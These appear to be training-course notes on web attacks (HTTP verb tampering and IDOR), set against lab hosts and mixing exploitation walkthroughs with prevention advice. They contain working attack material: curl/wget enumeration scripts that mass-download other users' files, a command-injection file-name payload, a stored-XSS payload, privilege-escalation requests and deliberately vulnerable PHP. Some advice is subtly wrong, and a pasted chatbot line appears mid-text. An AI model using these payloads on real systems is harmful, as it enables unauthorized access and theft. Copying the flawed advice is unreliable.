# Introduction 
### 1. HTTP Verb Tampering

- **Definition**: Exploiting web servers that accept multiple HTTP methods (verbs).
- **Risk**: Can bypass authorization mechanisms and security controls.
- **Example**: Using `PUT`, `DELETE`, or `OPTIONS` instead of `GET`/`POST` to gain unauthorized access.
- **Cause**: Misconfigured web servers that don’t restrict HTTP verbs properly.

### 2. Insecure Direct Object References (IDOR)

- **Definition**: Exploiting predictable object references (e.g., file IDs) to access unauthorized data.
- **Risk**: Exposure of other users’ files or sensitive data.
- **Example**: Accessing `/user/102` instead of `/user/101`.
- **Cause**: Lack of robust back-end access control and predictable identifiers.

### 3. XML External Entity (XXE) Injection

- **Definition**: Injecting malicious XML to exploit vulnerable XML parsers.
- **Risk**: Disclosure of local server files, credentials, or even remote code execution.
- **Example**: Sending an XML payload referencing local files (e.g., `/etc/passwd`).
- **Cause**: Use of outdated or insecure XML libraries without proper configuration.

---

# HTTP Verb Tampering

## Overview

- HTTP supports multiple **verbs/methods** (e.g., GET, POST, PUT).
- **Developers usually handle only GET and POST**, but web servers may accept all verbs unless explicitly restricted.
- HTTP Verb Tampering occurs when attackers send unexpected HTTP methods to **bypass access controls or exploit vulnerabilities**.

## Common HTTP Verbs

| Verb    | Description                                                  |
|---------|--------------------------------------------------------------|
| GET     | Retrieves data                                               |
| POST    | Submits data                                                 |
| HEAD    | Like GET, but returns only headers                           |
| PUT     | Uploads/replaces resource at the specified URI               |
| DELETE  | Deletes resource at the specified URI                        |
| OPTIONS | Returns allowed methods for the target resource              |
| PATCH   | Applies partial modifications to a resource                  |


## Causes of HTTP Verb Tampering

### 1. Insecure Web Server Configurations

- Servers may apply access controls **only to specific verbs**.
- Example:
  ```xml
  <Limit GET POST>
      Require valid-user
  </Limit>
  ```

* Only GET and POST requests require authentication.
* An attacker may use `HEAD` or `OPTIONS` to bypass controls.

### 2. Insecure Coding Practices

* Filters may be applied **only to specific methods**.
* Example (PHP):

  ```php
  $pattern = "/^[A-Za-z\s]+$/";
  if(preg_match($pattern, $_GET["code"])) {
      $query = "SELECT * FROM ports WHERE port_code LIKE '%" . $_REQUEST["code"] . "%'";
  }
  ```
  * GET input is sanitized, but query uses `$_REQUEST`, which includes POST.
  * Attacker sends malicious input via POST → bypasses filter → **SQL Injection** possible.
---

# Bypassing Basic Authentication with HTTP Verb Tampering

## Overview

- HTTP Verb Tampering can exploit **misconfigured authentication** in web servers.
- This type of attack can **bypass HTTP Basic Authentication** using lesser-checked HTTP methods.
- Vulnerability is often due to server restricting only certain HTTP methods (e.g., GET, POST).

## Identification

- File Manager web app has a **Reset** function at `/admin/reset.php` which is **protected by Basic Auth**.
- Accessing `/admin/` or `/admin/reset.php` directly results in a **401 Unauthorized**.
- Indicates that the **entire `/admin/` directory is protected**.

## Exploitation Steps

1. **Intercept original request** (GET) to `/admin/reset.php`.
2. **Change method to POST** in Burp Suite.
   - Still returns **401 Unauthorized** → GET and POST are both protected.
3. **Send OPTIONS request** to see allowed HTTP methods:
   ```bash
   curl -i -X OPTIONS http://SERVER_IP:PORT/
    ```

* Response includes: `Allow: POST, OPTIONS, HEAD, GET`
* Indicates server accepts **HEAD requests**.

4. **Send HEAD request** to `/admin/reset.php`.

   * No login prompt.
   * No response body (expected behavior of HEAD).
   * Reset function is executed successfully → **authentication bypassed**.

## Key Points

* **HEAD** method can be used like GET but without a response body.
* Some servers **don’t enforce auth** checks on all methods (e.g., HEAD, OPTIONS).
* Vulnerability stems from **incomplete server-side access control configuration**.

---

# Bypassing Security Filters with HTTP Verb Tampering

## Overview

- **Insecure coding** during web app development can cause vulnerabilities in security filters.
- Filters may only cover specific HTTP methods (e.g., POST), allowing attackers to bypass them by using other methods (e.g., GET).
- This is a common vulnerability that arises from **incomplete filter application** across HTTP methods.

## Identification

1. **File Manager Web Application** blocks special characters in file names (e.g., `test;`) to prevent injection attacks.
   - Displays message: **"Malicious Request Denied!"**
   - Security filters are in place to detect and block malicious requests (e.g., command injections).

2. The filter **properly blocks** requests using special characters in the file name to prevent injection.

## Exploitation Steps

1. **Intercept request** in Burp Suite.
2. **Change HTTP method** from POST to GET.
   - Send a **GET request** with the file name `test%3B` (URL-encoded `test;`).
   - **Result**: The file is successfully created, and no filter message is displayed.

3. **Test for command injection** by attempting to create multiple files with the payload `file1; touch file2;`:
   - Payload: `file1%3B+touch+file2%3B` (URL-encoded).
   - **Change request method** to GET.
   
4. **Send the request**, and both files (`file1` and `file2`) are created, showing successful command injection:
   - **Files created**: `file1`, `file2`, `test`, `notes.txt`.

## Key Points

- **Insecure coding** causes the vulnerability when security filters are not applied across all HTTP methods.
- Attackers can **bypass filters** by sending requests with HTTP methods the filters don’t account for (e.g., GET instead of POST).
- HTTP Verb Tampering allows **Command Injection** by bypassing filters.

---

# Preventing HTTP Verb Tampering

## Overview

- **HTTP Verb Tampering** vulnerabilities arise from insecure web server configurations and insecure coding practices.
- The vulnerability occurs when **HTTP methods** are not properly restricted, allowing attackers to bypass security measures.
- This section discusses how to **patch** and **prevent** these vulnerabilities.
## Insecure Configuration

1. **Apache Configuration Vulnerability**:
   - Limiting authorization to **specific HTTP methods** (e.g., GET) exposes the application to other methods (POST, HEAD, etc.).
   ```xml
   <Directory "/var/www/html/admin">
       AuthType Basic
       AuthName "Admin Panel"
       AuthUserFile /etc/apache2/.htpasswd
       <Limit GET>
           Require valid-user
       </Limit>
   </Directory>
   ```

* **Fix**: Use `<LimitExcept>` to restrict all methods except the specified ones.

```xml
<Directory "/var/www/html/admin">
    AuthType Basic
    AuthName "Admin Panel"
    AuthUserFile /etc/apache2/.htpasswd
    <LimitExcept GET POST>
        Require valid-user
    </LimitExcept>
</Directory>
```

2. **Tomcat Configuration Vulnerability**:

   * Restricting HTTP methods (e.g., GET) leaves the app vulnerable to other methods.

   ```xml
   <security-constraint>
       <web-resource-collection>
           <url-pattern>/admin/*</url-pattern>
           <http-method>GET</http-method>
       </web-resource-collection>
       <auth-constraint>
           <role-name>admin</role-name>
       </auth-constraint>
   </security-constraint>
   ```

   * **Fix**: Avoid restricting methods with `<http-method>`, or use proper configuration to cover all methods.

3. **ASP.NET Configuration Vulnerability**:

   * Limiting HTTP methods (e.g., GET) exposes the application to attacks via other methods.

   ```xml
   <system.web>
       <authorization>
           <allow verbs="GET" roles="admin">
               <deny verbs="GET" users="*"/>
           </allow>
       </authorization>
   </system.web>
   ```

   * **Fix**: Use proper access controls across all methods, or consider using `add/remove` statements to handle method restrictions.

4. **General Recommendations**:

   * Avoid restricting authorization to specific HTTP verbs.
   * Use safe keywords to limit or allow methods across web servers:

     * **Apache**: `<LimitExcept>`
     * **Tomcat**: `http-method-omission`
     * **ASP.NET**: `add/remove`
   * Consider **disabling HEAD** requests unless specifically needed.

## Insecure Coding

1. **PHP Code Vulnerability**:

   * The code below checks for special characters only in `$_POST['filename']`, but **uses both GET and POST** parameters via `$_REQUEST['filename']`.

   ```php
   if (isset($_REQUEST['filename'])) {
       if (!preg_match('/[^A-Za-z0-9. _-]/', $_POST['filename'])) {
           system("touch " . $_REQUEST['filename']);
       } else {
           echo "Malicious Request Denied!";
       }
   }
   ```

   * **Exploit**: By using GET requests, attackers bypass the filter as `$_POST` parameters are empty, and GET parameters are used in the command, leading to **Command Injection**.

2. **Solution**: Ensure **consistency in HTTP method usage** across all code functions:

   * Avoid mixing GET and POST methods.
   * Ensure that **security filters** cover all HTTP methods.
   * Use **appropriate security functions** that test all request parameters across methods:

     * **PHP**: `$_REQUEST['param']`
     * **Java**: `request.getParameter('param')`
     * **C#**: `Request['param']`

3. **Testing**:

   * Expand the scope of your **security filters** to cover all request parameters, regardless of HTTP method.


## Key Takeaways

* **Insecure Configurations**: Avoid restricting methods like GET and POST. Use proper configurations to handle all HTTP methods.
* **Insecure Coding**: Always maintain **consistent HTTP method usage** in security filters to avoid method-specific vulnerabilities.
* **Testing**: Ensure that security tests cover **all parameters** from all HTTP methods (GET, POST, etc.).

---

# IDOR (Insecure Direct Object References)

## What is IDOR?
- IDOR is a type of access control vulnerability.
- Occurs when an application exposes direct references to internal objects (e.g., files, database IDs) without proper authorization checks.
- Example: `download.php?file_id=123` — changing the ID may give access to other users' files if access control is missing.

## Key Causes
- Lack of server-side access control checks.
- Over-reliance on front-end to enforce restrictions.
- Predictable or guessable object identifiers (e.g., incremental IDs).

## What Makes it a Vulnerability?
- Just exposing direct references is not enough.
- It becomes a vulnerability **only if**:
  - There's **no back-end validation** to ensure the user is authorized to access the referenced object.

## Impact of IDOR Vulnerabilities
- **Information Disclosure**: Access to sensitive files, user data, or credit card details.
- **Data Manipulation**: Modify or delete data of other users.
- **Privilege Escalation**: Use admin functions (via insecure endpoints) as a standard user.
- **Account Takeover** or **Full Application Compromise**.

## Examples
- Accessing others' files: `file_id=124`
- Changing user roles: `change_role.php?user_id=100&role=admin`

## Why It’s Common
- Building and maintaining comprehensive access control is complex.
- Many developers overlook server-side checks.
- Difficult to detect via automated testing tools.

## Prevention Techniques
- Implement robust **Role-Based Access Control (RBAC)**.
- Always validate user permissions on the **server-side**.
- Use unpredictable, non-sequential identifiers (UUIDs).
- Avoid exposing sensitive endpoints in front-end code.

---

# Identifying IDOR Vulnerabilities

## 1. URL Parameters & APIs
- Look for object references in URLs or API parameters: e.g., `?uid=1`, `?filename=file_1.pdf`.
- Try modifying/incrementing values (e.g., `?uid=2`) to access unauthorized data.
- Use fuzzing tools to automate the testing of various object references.
- Successful access to data not owned by the current user indicates a potential IDOR.

## 2. AJAX Calls
- Check front-end JavaScript for unused or hidden AJAX functions.
- Some functions may exist but be disabled based on user roles.
- Example:

```javascript
$.ajax({
    url: "change_password.php",
    type: "post",
    data: {uid: user.uid, password: user.password, is_admin: is_admin}
});
````

* Even if not visible in the UI, test discovered functions manually for IDOR vulnerabilities.

## 3. Hashing / Encoding of Object References

* Some references may use encoding (e.g., Base64) or hashing (e.g., MD5).
* **Base64 Example**:

  * `filename=ZmlsZV8xMjMucGRm` → decode to `file_123.pdf`, then encode `file_124.pdf`.
* **Hashing Example**:

  * If hash is derived from a filename:

    * `CryptoJS.MD5('file_1.pdf') → 'c81e728d...'`
    * Hash another filename and test access.

## 4. Compare User Roles

* Create multiple user accounts to compare requests and responses.
* Observe how object references differ between users.
* Try reusing one user’s request (e.g., salary data) while logged in as another user.

```json
{
  "type": "salary",
  "url": "/services/data/salaries/users/1"
}
```

* If access is granted without proper verification, an IDOR vulnerability exists.

## Key Indicators

* Predictable object references.
* Reused or shared identifiers.
* Missing server-side permission checks.
* Hidden or unused parameters/API endpoints.

---

# Mass IDOR Enumeration 

## Overview
- After identifying an IDOR vulnerability, mass enumeration can be used to access large sets of unauthorized data.
- Often occurs when predictable parameters (e.g., `uid=1`, `uid=2`) are used without back-end access control.

## Example Scenario
- Employee Manager application shows documents using URL:  
  `documents.php?uid=1`
- Document links follow a predictable pattern:
  - `/documents/Invoice_1_09_2021.pdf`
  - `/documents/Report_1_10_2021.pdf`
- Changing `uid` to another number may expose other users' documents if access control is missing.

## Vulnerable Patterns
- Predictable file names using UID and date.
- GET parameters like `uid` or `uid_filter` directly control data access.
- Filter removal (e.g., removing `uid_filter`) may expose all documents.

## Mass Enumeration Using Bash Script

### Step 1: Identify Document Links
```bash
curl -s "http://SERVER_IP:PORT/documents.php?uid=3" | grep -oP "\/documents.*?.pdf"
````

### Step 2: Create Enumeration Script

```bash
#!/bin/bash

url="http://SERVER_IP:PORT"

for i in {1..10}; do
    for link in $(curl -s "$url/documents.php?uid=$i" | grep -oP "\/documents.*?.pdf"); do
        wget -q $url/$link
    done
done
```

* Loops through UID values from 1 to 10.
* Extracts PDF links using regex.
* Downloads each document using `wget`.

## Tools for Automation

* **Burp Suite Intruder**: Automate parameter fuzzing and IDOR testing.
* **OWASP ZAP Fuzzer**: Perform mass IDOR testing through automated requests.
* **Custom scripts**: Bash, Python, or PowerShell can be used to automate enumeration and downloads.

---

# Bypassing Encoded References

## Overview
- Some web applications use **encoded or hashed references** to make IDOR exploitation harder.
- Common formats: Base64, MD5, SHA1, etc.
- If encoding/hashing logic is exposed in front-end JavaScript, attackers can reverse it.

## Example Scenario
- Web app uses a POST request to download contracts:
  ```http
  POST /download.php
  contract=cdd96d3cc73d1dbdaffa03cc6cd7339b
  ```

* Appears to be MD5 hash, not clear text reference.

## Function Disclosure via Front-End JavaScript

* JavaScript function `downloadContract(uid)` found in source:

  ```javascript
  function downloadContract(uid) {
      $.redirect("/download.php", {
          contract: CryptoJS.MD5(btoa(uid)).toString()
      }, "POST", "_self");
  }
  ```
* Logic: `Base64(uid)` → MD5 hash → sent as `contract` parameter

## Hash Reversal (Local Testing)

```bash
# Generate the encoded hash for uid=1
echo -n 1 | base64 -w 0 | md5sum | tr -d ' -'
# Output: cdd96d3cc73d1dbdaffa03cc6cd7339b
```

* Confirms that the hash is derived from Base64(uid)

## Exploiting for Mass Enumeration

* Goal: Download all contracts from `uid=1` to `uid=10`

### Bash Script Example

```bash
#!/bin/bash

for i in {1..10}; do
    for hash in $(echo -n $i | base64 -w 0 | md5sum | tr -d ' -'); do
        curl -sOJ -X POST -d "contract=$hash" http://SERVER_IP:PORT/download.php
    done
done
```

### Output Example

```bash
contract_cdd96d3cc73d1dbdaffa03cc6cd7339b.pdf
contract_0b7e7dee87b1c3b98e72131173dfbbbf.pdf
```

## Key Takeaways

* Encoded/hashing mechanisms don’t secure references if:

  * Encoding logic is exposed in JavaScript
  * Hashes are easily replicable (e.g., `md5(base64(uid))`)
* Always validate access on the **back-end** based on the user session, not just on request parameters.

---

# IDOR in Insecure APIs

## 🔍 Types of IDOR Vulnerabilities

1. **IDOR (Information Disclosure)**

   * Allows unauthorized reading of data/resources.
   * Example: Viewing other users' profiles by changing UID in GET requests.

2. **IDOR (Insecure Function Calls)**

   * Allows performing actions as another user.
   * Example: Editing another user's profile, changing roles, or deleting users.


## 🛠 Testing for IDOR in Function Calls

### Application Under Test:

* **Edit Profile** form submits a `PUT` request to:

  ```
  /profile/api.php/profile/<uid>
  ```

### Payload Example:

```json
{
    "uid": 1,
    "uuid": "40f5888b67c748df7efba008e7c2f9d2",
    "role": "employee",
    "full_name": "Amy Lindon",
    "email": "a_lindon@employees.htb",
    "about": "A Release is like a boat..."
}
```

### Client-Controlled Parameters:

* `uid`, `uuid`, `role`, `full_name`, `email`, `about`
* `role=employee` is also set in a cookie

### Test Cases & Observations:

| Test                                   | Result                                      |
| -------------------------------------- | ------------------------------------------- |
| Change `uid` to another user (e.g., 2) | `uid mismatch`                              |
| Change endpoint and `uid` to user 2    | `uuid mismatch`                             |
| POST request to create user            | `Creating new employees is for admins only` |
| DELETE request for user                | `Deleting employees is for admins only`     |
| Change role to `admin`                 | `Invalid role`                              |

> ✅ Backend performs **UID/UUID checks** and **role restrictions**
> ❌ Role is set on client-side — potential for privilege escalation if not validated properly on server

## 🔓 Exploiting IDOR: Information Disclosure

### Action:

* Test the API's `GET` requests for reading other users' data

### Example Test:

```http
GET /profile/api.php/profile/2 HTTP/1.1
Cookie: role=employee
```

### If Successful:

* User data is leaked (e.g., `uuid`, `email`, etc.)
* Use this information to craft valid `PUT`/`POST`/`DELETE` requests


## 🧠 Key Learnings

* **IDOR Function Calls** often fail due to backend validations (uid/uuid mismatch, role checks)
* **Information Disclosure via IDOR** can provide the needed data (like UUIDs) to bypass those checks
* APIs relying on **client-side role enforcement** (e.g., in cookies or JSON) are insecure
* Always test both **read** and **write** endpoints for IDOR

---

# 🔗 Chaining IDOR Vulnerabilities

## 📖 Summary

Chaining **IDOR (Insecure Direct Object Reference)** vulnerabilities allows attackers to:

* Leak user data via **GET** requests (information disclosure)
* Modify other users' data via **PUT** requests (insecure function calls)
* Escalate privileges (e.g. set own role to `web_admin`)
* Take over accounts or perform mass modifications

## 🔓 Step-by-Step Exploitation

### 1. **Information Disclosure via IDOR**

* Send a `GET` request to retrieve another user's details:

  ```http
  GET /profile/api.php/profile/2
  Cookie: role=employee
  ```
* Response:

  ```json
  {
      "uid": "2",
      "uuid": "4a9bd19b3b8676199592a346051f950c",
      "role": "employee",
      "full_name": "Iona Franklyn",
      "email": "i_franklyn@employees.htb",
      "about": "..."
  }
  ```

### 2. **Modify Another User’s Data**

* Use the leaked `uuid` to send a `PUT` request:

  ```http
  PUT /profile/api.php/profile/2
  {
      "uid": 2,
      "uuid": "4a9bd19b3b8676199592a346051f950c",
      "role": "employee",
      "full_name": "Modified",
      "email": "attacker@example.com",
      "about": "<script>alert(1)</script>"
  }
  ```

### 3. **Enumerate Users to Find Admin**

* Script or manual enumeration of `/profile/api.php/profile/<uid>`
* Identify admin user:

  ```json
  {
      "uid": "X",
      "uuid": "a36fa9e66e85f2dd6f5e13cad45248ae",
      "role": "web_admin",
      "full_name": "administrator",
      "email": "webadmin@employees.htb",
      "about": "HTB{FLAG}"
  }
  ```

### 4. **Privilege Escalation**

* Modify your own role to `web_admin`:

  ```json
  {
      "uid": 1,
      "uuid": "your-valid-uuid",
      "role": "web_admin",
      ...
  }
  ```
* No error = success ✅

### 5. **Create New Users (as Admin)**

* Send a `POST` request:

  ```http
  POST /profile/api.php
  {
      "uid": 99,
      "uuid": "new-uuid",
      "role": "employee",
      "full_name": "New User",
      "email": "new@user.com",
      "about": "Created by admin"
  }
  ```

## 🧪 Attack Possibilities

* 🛠 **Account Takeover**: Modify user’s email → trigger password reset
* 💉 **Stored XSS**: Inject script in `about` field
* 👑 **Admin Access**: Elevate role to `web_admin`
* 🧹 **Mass User Edits**: Change emails or inject payloads across all users

## 🔐 Key Takeaways

* APIs relying on client-side authorization (e.g. role cookies) are insecure.
* UUIDs often serve as access tokens — leaking them allows privilege abuse.
* Combining **information leakage** and **insecure function calls** leads to full compromise.
* Always test for both read (`GET`) and write (`PUT`, `POST`, `DELETE`) IDOR vectors.

---

Here are concise notes in **Markdown** format summarizing **IDOR prevention** techniques, including **Object-Level Access Control** and **Secure Object Referencing**:

---

# 🔐 IDOR Prevention

## 1. 🛡️ Object-Level Access Control (OLAC)

### 🔑 Core Principle

Prevent unauthorized access to objects by checking user permissions **on the server-side** before fulfilling any request.

### ✅ Best Practices

* Implement **Role-Based Access Control (RBAC)**.
* Centralize role and permission mapping.
* Validate access **on the back-end**, never rely on client-side roles or identifiers.

### 🧪 Example Rule (Pseudocode / Firebase-style):

```js
match /api/profile/{userId} {
    allow read, write: if user.isAuth == true
    && (user.uid == userId || user.roles == 'admin');
}
```

* ✅ Allows users to access only their own profile
* ✅ Admins can access any profile
* 🚫 No trust in client-supplied role or uid

## 2. 🧾 Secure Object Referencing

### ⚠️ Avoid:

* Predictable IDs: `/profile?uid=1`, `/documents/2`
* Front-end generated or visible object references

### ✅ Use:

* **UUID v4** or **salted hashes** as object references
* Server-side generated and stored references
* Map references to real objects in the database

### ✅ Benefits:

* Reduces guessability and enumeration
* Prevents many forms of automated IDOR attacks

### 🧱 Example (PHP - Insecure):

```php
$uid = intval($_REQUEST['uid']);
$query = "SELECT url FROM documents WHERE uid = " . $uid;
```

### ✅ Secure Alternative:

* Use a UUID (e.g. `89c9b29b-d19f-4515-b2dd-abb6e693eb20`)
* Query with a **back-end validated token**:

```php
$uuid = $_REQUEST['uuid'];
$query = "SELECT url FROM documents WHERE uuid = ?";
```

---

---

